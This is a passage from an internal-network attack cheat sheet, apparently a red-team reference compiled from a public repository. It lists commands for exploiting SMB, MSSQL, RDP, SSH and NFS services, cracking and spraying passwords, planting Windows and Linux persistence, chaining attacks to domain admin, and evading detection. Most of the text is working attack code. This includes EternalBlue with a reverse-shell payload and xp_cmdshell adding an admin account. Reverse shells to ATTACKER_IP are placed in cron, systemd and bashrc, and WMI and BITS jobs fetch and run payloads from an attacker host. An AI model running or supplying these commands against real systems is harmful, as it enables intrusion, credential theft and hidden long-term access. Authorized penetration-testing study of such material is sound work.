smbclient \\\\TARGET_IP\\SHARE -U user%pass -c "recurse ON; prompt OFF; mget *"

# Mount share
mount -t cifs //TARGET_IP/SHARE /mnt/share -o user=user,password=pass,domain=DOMAIN

# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/shell_reverse_tcp
exploit

# PrintNightmare (CVE-2021-1675/34527)
impacket-rpcdump @TARGET_IP | grep -A 5 "\\pipe\\spoolss"
python3 CVE-2021-1675.py DOMAIN/user:pass@TARGET_IP '\\ATTACKER\share\malicious.dll'
```

### LDAP

```bash
# Anonymous LDAP enumeration
ldapsearch -H ldap://TARGET_IP -x -b "DC=domain,DC=local"
ldapsearch -H ldap://TARGET_IP -x -b "DC=domain,DC=local" "(objectClass=User)"
ldapsearch -H ldap://TARGET_IP -x -b "" -s base namingContexts

# Authenticated
ldapsearch -H ldap://TARGET_IP -D "user@domain.local" -w pass \
  -b "DC=domain,DC=local" "(objectClass=User)"

# ldapdomaindump (comprehensive)
ldapdomaindump -u 'DOMAIN\user' -p 'pass' -o /tmp/ldap ldap://DC_IP

# Active Directory Integrated DNS (ADIDNS)
adidnsdump -u DOMAIN\\user -p pass DC_IP

# LDAP password spray
netexec ldap DC_IP -u users.txt -p 'CommonPass123' --no-bruteforce
```

### MSSQL

```bash
# Enumeration
netexec mssql TARGET_IP -u sa -p ''
netexec mssql TARGET_IP -u user -p pass
impacket-mssqlclient DOMAIN/user:pass@TARGET_IP -windows-auth

# Execute OS commands (via xp_cmdshell)
# In mssqlclient:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Hacker123! /add && net localgroup administrators hacker /add';

# UNC path injection (capture NTLM hash)
EXEC xp_dirtree '\\ATTACKER_IP\share'
EXEC master..xp_subdirs '\\ATTACKER_IP\share'

# Read files
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS DATA;

# SQL Server linked servers
SELECT * FROM sys.servers;
EXEC('SELECT * FROM OPENQUERY(LINKEDSERVER, ''SELECT @@servername'')')

# Privilege escalation via SQL Agent jobs (if db_owner)
USE msdb; EXEC sp_add_job @job_name='attack';
EXEC sp_add_jobstep @job_name='attack', @step_name='cmd', @command='EXEC xp_cmdshell ''whoami > C:\out.txt''';
EXEC sp_start_job 'attack';
```

### WinRM

```bash
# Test WinRM access
netexec winrm TARGET_IP -u user -p pass

# Connect
evil-winrm -i TARGET_IP -u user -p pass
evil-winrm -i TARGET_IP -u user -H NT_HASH

# PowerShell Remoting
$s = New-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)
Enter-PSSession $s
Invoke-Command -Session $s -ScriptBlock { whoami }
```

### RDP

```bash
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service remoteadmin enable
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow

# Connect
rdesktop TARGET_IP
xfreerdp /u:user /p:pass /v:TARGET_IP
xfreerdp /u:Administrator /pth:NT_HASH /v:TARGET_IP +clipboard /dynamic-resolution

# NLA bypass / PTH for RDP
xfreerdp /u:user /pth:NT_HASH /v:TARGET_IP /cert-ignore

# RDP brute force
crowbar -b rdp -s TARGET_IP/32 -u user -C passwords.txt -n 1
```

### SSH

```bash
# Enumeration
nmap -sV -p 22 TARGET_IP
ssh-audit TARGET_IP  # algorithm/vulnerability audit

# Brute force
hydra -l user -P rockyou.txt TARGET_IP ssh
medusa -h TARGET_IP -u user -P pass.txt -M ssh

# Key-based auth — find authorized_keys
cat ~/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# Find SSH private keys
find / -name id_rsa 2>/dev/null
find / -name *.pem 2>/dev/null

# SSH via socks proxy
ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@TARGET
```

### FTP

```bash
# Enumeration
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst TARGET_IP

# Anonymous login
ftp TARGET_IP
# user: anonymous / pass: (blank or email)

# Brute force
hydra -l user -P rockyou.txt ftp://TARGET_IP

# Bounce attack
nmap -Pn -p 21 --script ftp-bounce --script-args bounce-port=22,bounce-host=INTERNAL_HOST TARGET_IP
```

### SNMP

```bash
# Enumeration
nmap -sU -p 161 --script snmp-info,snmp-sysdescr TARGET_IP
snmpwalk -v1 -c public TARGET_IP
snmpwalk -v2c -c public TARGET_IP
snmpwalk -v3 -u username -l authPriv -a SHA -A authpass -x DES -X privpass TARGET_IP 1.3.6

# OneSixtyOne — community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP

# SNMP enumeration
snmp-check TARGET_IP -c public
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.1         # system
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2    # running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.6.3    # installed software
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25 # users

# SNMP write — set value
snmpset -v2c -c private TARGET_IP OID_TYPE VALUE
```

### NFS

```bash
# Enumeration
showmount -e TARGET_IP
nmap -sV -p 111,2049 --script nfs* TARGET_IP

# Mount NFS share
mount -t nfs TARGET_IP:/exported/path /mnt/nfs
mount -t nfs -o vers=3 TARGET_IP:/share /mnt/nfs

# Privilege escalation via root squash off
# If no_root_squash configured:
# Create SUID bash on the share as root
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target machine:
/mnt/nfs/bash -p  # SUID bash gives root

# Check no_root_squash
cat /etc/exports  # on server
# /share *(rw,no_root_squash)
```

---

## 19. Password Attacks

### Hashcat Modes Cheatsheet

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA-256 |
| 1800 | sha512crypt $6$ |
| 3000 | LM |
| 5500 | NetNTLMv1 / NTLMv1 |
| 5600 | NetNTLMv2 / NTLMv2 |
| 7300 | IPMI2 RAKP HMAC-SHA1 |
| 13100 | Kerberos 5 TGS-REP (RC4) |
| 18200 | Kerberos 5 AS-REP |
| 19600 | Kerberos 5 TGS-REP (AES128) |
| 19700 | Kerberos 5 TGS-REP (AES256) |
| 1500 | descrypt |
| 500 | md5crypt |
| 3200 | bcrypt |

```bash
# Dictionary attack
hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 5600 hashes.txt rockyou.txt

# Rules-based
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Combinator attack
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Mask/brute force
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d?d?d  # Passw0rd1 style
hashcat -m 1000 -a 3 hashes.txt -i --increment-min=7 ?a?a?a?a?a?a?a?a

# Hybrid (dict + mask)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d  # word123
hashcat -m 1000 -a 7 hashes.txt ?d?d?d rockyou.txt  # 123word

# Session management
hashcat -m 1000 hashes.txt rockyou.txt --session=test123
hashcat --session=test123 --restore

# Show cracked
hashcat -m 1000 hashes.txt --show
hashcat -m 1000 hashes.txt --show --outfile-format=2

# John the Ripper
john --format=NT hashes.txt --wordlist=rockyou.txt
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt
john --show hashes.txt
```

### Password Spraying

```bash
# LDAP spray (AD)
netexec ldap DC_IP -u users.txt -p 'Password123!' --no-bruteforce
netexec ldap DC_IP -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success

# SMB spray
netexec smb DC_IP -u users.txt -p 'Password123!' --no-bruteforce

# Kerbrute — Kerberos pre-auth spray (no lockout risk)
kerbrute passwordspray -d domain.local users.txt 'Password123!' --dc DC_IP
kerbrute userenum -d domain.local users.txt --dc DC_IP   # user enum first

# Office 365 / Azure spray
MSOLSpray.py --userlist users.txt --password Password123!
trevorspray -u users.txt -p 'Password123!' --delay 0.5

# Spray timing considerations:
# Default lockout: 10 attempts per 30 minutes
# Safe spray: 1 password per 60 minutes
# Watch for: AD FS, Azure AD, ADFS lockout vs AD lockout

# Check current lockout policy
net accounts /domain
Get-ADDefaultDomainPasswordPolicy
```

### Common Wordlists

```bash
# Standard wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

# AD-specific patterns
# Create custom list with CeWL
cewl -d 2 -w custom.txt http://company.com

# Username patterns
# first.last / flast / firstname / firstname.last

# CUPP — custom wordlist from OSINT
python3 cupp.py -i
```

---

## 20. Persistence — Windows

### Registry Persistence

```powershell
# HKCU Run (user-level, no admin)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\user\AppData\Local\Temp\backdoor.exe" /f

# HKLM Run (system-level, requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Windows\System32\malicious.exe" /f

# RunOnce (single execution, then deleted)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Update /t REG_SZ /d "C:\temp\update.exe" /f

# Winlogon Helper DLL
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\System32\evil.exe" /f

# Image File Execution Options (debugger hijack)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
# → Press Shift 5x at login screen for SYSTEM shell

# SharPersist
SharPersist -t reg -c "C:\Windows\System32\cmd.exe /c whoami" -f "C:\temp\out.txt" -k "hkcu" -v "Backdoor" -m add
```

### Scheduled Tasks

```powershell
# Create task (user-level)
schtasks /create /sc ONCE /st 00:00 /tn "WindowsUpdate" /tr "C:\temp\backdoor.exe"
schtasks /run /tn "WindowsUpdate"

# Create task (system-level, runs as SYSTEM)
schtasks /create /sc DAILY /st 09:00 /tn "SystemHealth" /tr "C:\Windows\Temp\beacon.exe" /ru SYSTEM

# PowerShell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -Daily -At 9am
$S = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
$Set = New-ScheduledTaskSettingsSet
Register-ScheduledTask -Action $A -Trigger $T -Principal $S -Settings $Set -TaskName "WindowsUpdate"

# Hijack existing task (modify legitimate task)
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\temp\evil.exe"

# SharPersist
SharPersist -t schtask -c "cmd.exe" -a "/c whoami > C:\temp\out.txt" -n "WindowsUpdate" -m add -o daily
```

### WMI Event Subscriptions

```powershell
# Create WMI persistence via WMIC
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE \
  Name="PentestLab", EventNameSpace="root\cimv2", QueryLanguage="WQL", \
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE \
  Name="PentestLab", ExecutablePath="C:\Windows\System32\evil.exe", \
  CommandLineTemplate="C:\Windows\System32\evil.exe"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE \
  Filter="__EventFilter.Name=\"PentestLab\"", \
  Consumer="CommandLineEventConsumer.Name=\"PentestLab\""

# PowerShell WMI persistence (fileless, OnStartup)
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name="WinUpdate"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$Query}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name="WinUpdate"; CommandLineTemplate="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter=$WMIEventFilter; Consumer=$WMIEventConsumer}

# Cleanup / detection
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### Windows Services

```powershell
# Create new service
sc create "WindowsDefenderUpdate" binPath= "C:\Windows\Temp\evil.exe" start= auto DisplayName= "Windows Defender Update"
sc start "WindowsDefenderUpdate"

# PowerShell
New-Service -Name "WindowsDefenderUpdate" -BinaryPathName "C:\Windows\Temp\evil.exe" -StartupType Automatic
Start-Service "WindowsDefenderUpdate"

# BITS Jobs (Background Intelligent Transfer Service)
bitsadmin /transfer "WindowsUpdate" /download /priority high http://ATTACKER/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /create "WindowsUpdate"
bitsadmin /addfile "WindowsUpdate" "http://ATTACKER/payload.exe" "C:\Windows\Temp\payload.exe"
bitsadmin /SetNotifyCmdLine "WindowsUpdate" "C:\Windows\Temp\payload.exe" NUL
bitsadmin /resume "WindowsUpdate"
```

### Startup Folder

```powershell
# User startup
gc C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
"start /b C:\Users\user\AppData\Local\Temp\backdoor.exe" > "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat"

# All users startup (admin required)
copy evil.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# SharPersist
SharPersist -t startupfolder -c "cmd.exe" -a "/c C:\Windows\Temp\evil.exe" -f "Backdoor" -m add
```

### Golden Certificate

```powershell
# Forge certificate using stolen CA private key
# (post-domain-compromise persistence)
# Extract CA certificate and private key:
# On CA server:
certutil -exportPFX -user MY CA_CERT_CN C:\temp\ca.pfx

# Forge user certificate
ForgeCert.exe --CaCertPath C:\temp\ca.pfx --CaCertPassword "password" \
  --Subject "CN=Administrator" --SubjectAltName "administrator@domain.local" \
  --NewCertPath C:\temp\admin.pfx

# Use forged cert for Kerberos
Rubeus.exe asktgt /user:administrator /certificate:C:\temp\admin.pfx /ptt
```

---

## 21. Persistence — Linux

### Crontab

```bash
# User crontab
crontab -e
# Add: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# Add: @reboot sleep 200 && ncat ATTACKER_IP 4242 -e /bin/bash

# System crontab (root required)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab

# cron.d directory
echo "*/5 * * * * root /tmp/.backdoor" > /etc/cron.d/syscheck

# cron.daily/weekly/hourly scripts
echo '/tmp/.backdoor &' >> /etc/cron.daily/logrotate
```

### SSH Keys

```bash
# Add attacker's public key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...PUBLIC_KEY..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh/

# Root authorized_keys (if write access to /root)
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Generate key pair first:
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ""
cat /tmp/backdoor_key.pub >> ~/.ssh/authorized_keys
# Keep /tmp/backdoor_key (private key) for access
```

### Systemd Services

```bash
# User service (no root required)
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/persistence.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

systemctl --user enable persistence.service
systemctl --user start persistence.service

# System service (root required)
cat > /etc/systemd/system/systemd-resolve-helper.service << EOF
[Unit]
Description=DNS Resolution Helper

[Service]
Type=simple
ExecStart=/tmp/.backdoor
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-resolve-helper
systemctl start systemd-resolve-helper
```

### Bash Profile / RC Files

```bash
# ~/.bashrc — runs for interactive non-login bash
echo "nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> ~/.bashrc

# ~/.bash_profile — runs at login
echo "nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> ~/.bash_profile

# ~/.profile — runs for login shells
echo "/tmp/.backdoor &" >> ~/.profile

# /etc/profile.d/ (root required, affects all users)
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" > /etc/profile.d/syscheck.sh
chmod +x /etc/profile.d/syscheck.sh
```

### SUID Backdoor Binary

```bash
# Create SUID shell (root required)
cp /bin/bash /tmp/.suid_bash
chmod +s /tmp/.suid_bash

# Execute later
/tmp/.suid_bash -p  # -p preserves SUID privileges
```

### LD_PRELOAD Persistence

```bash
# Create malicious shared library
cat > /tmp/backdoor.c << EOF
#include <stdio.h>
#include <unistd.h>

void __attribute__((constructor)) backdoor() {
    // Fork to background
    if (fork() == 0) {
        execl("/bin/bash", "bash", "-i", ">& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL);
    }
}
EOF
gcc -shared -fPIC -o /tmp/backdoor.so /tmp/backdoor.c -nostartfiles

# Add to /etc/ld.so.preload (root required)
echo "/tmp/backdoor.so" >> /etc/ld.so.preload
```

### Git Hooks (User-Level)

```bash
# Backdoor all git operations for a user
git config --global core.hooksPath /tmp/.git_hooks
mkdir -p /tmp/.git_hooks

# Create malicious pre-commit hook
cat > /tmp/.git_hooks/pre-commit << EOF
#!/bin/bash
nohup /tmp/.backdoor &
EOF
chmod +x /tmp/.git_hooks/pre-commit
```

### Udev Rules

```bash
# Trigger on USB device insertion (root required)
echo 'ACTION=="add",ENV{DEVTYPE}=="usb_device",RUN+="/tmp/.backdoor"' \
  > /etc/udev/rules.d/99-persistence.rules
```

---

## QUICK REFERENCE: ATHENA ATTACK CHAIN TEMPLATES

### Template 1 — Unauthenticated Network → Domain Admin

```
1. LLMNR/NBT-NS Poisoning (Responder)
   → Capture NTLMv2 hash
   → Crack offline OR relay
2. SMB Relay (if SMB signing disabled)
   → ntlmrelayx → shell/SAM dump
   → OR relay to LDAP → create computer account
3. With valid credentials:
   → BloodHound enumeration
   → Find Kerberoastable accounts
4. Kerberoast → crack hash → service account creds
5. Enumerate ACLs → find WriteDACL/GenericAll path
6. Escalate to Domain Admin via ACL abuse
7. DCSync → dump all hashes
8. Golden Ticket → persistent domain access
```

### Template 2 — Phishing / Initial Access → Domain Admin

```
1. Initial foothold (phishing/exploit)
2. Local enumeration (whoami /priv, winpeas)
3. Token impersonation if SeImpersonatePrivilege
   → PrintSpoofer / GodPotato → SYSTEM
4. Dump LSASS or SAM
   → Extract hashes / kerberos tickets
5. Pass-the-Hash or Pass-the-Ticket
   → Lateral movement to higher-value hosts
6. Domain Admin on DC → DCSync
```

### Template 3 — ADCS ESC8 (No Credentials → Domain Admin)

```
1. Identify ADCS web enrollment enabled
   → certipy find -vulnerable
2. Set up ntlmrelayx → ADCS HTTP endpoint
3. Coerce DC authentication (PetitPotam)
4. Receive DC machine certificate
5. certipy auth → NTLM hash of DC
6. secretsdump with DC hash → krbtgt → Golden Ticket
```

### Template 4 — Cloud Foothold → Full Compromise

```
AWS:
1. Find leaked credentials (Truffelhog, GitHub search)
2. enumerate-iam → find escalation path
3. iam:AttachUserPolicy OR iam:CreatePolicyVersion
4. AdministratorAccess → account compromise

GCP:
1. SSRF → GCE metadata → service account token
2. Check IAM permissions → roles/editor or actAs
3. SA impersonation chain → high-priv SA
4. GCS exfil / GKE cluster admin
```

---

## DETECTION EVASION NOTES

- Use AES256 tickets instead of RC4 (avoids etype 0x17 alerts)
- Diamond Tickets over Golden Tickets (modify real TGT, not forge)
- Use `--smb2support` in ntlmrelayx for modern targets
- Avoid `xp_cmdshell` if possible (noisy) — use SQL Agent jobs or CLR
- DCOM lateral movement leaves less trace than PsExec (no service creation)
- WMI event subscriptions survive reboots and are fileless
- Use legitimate tools (LOLBins): certutil, bitsadmin, regsvr32, wscript
- Kerberoast RC4 vs AES — request AES tickets where possible to blend in
- Keep spray intervals > 30 minutes to avoid lockout threshold

---

*ATHENA Internal Network Attack Reference — ZerøK Labs*
*Compiled from InternalAllTheThings (MIT License) — github.com/swisskyrepo/InternalAllTheThings*
*For authorized penetration testing and red team operations only*
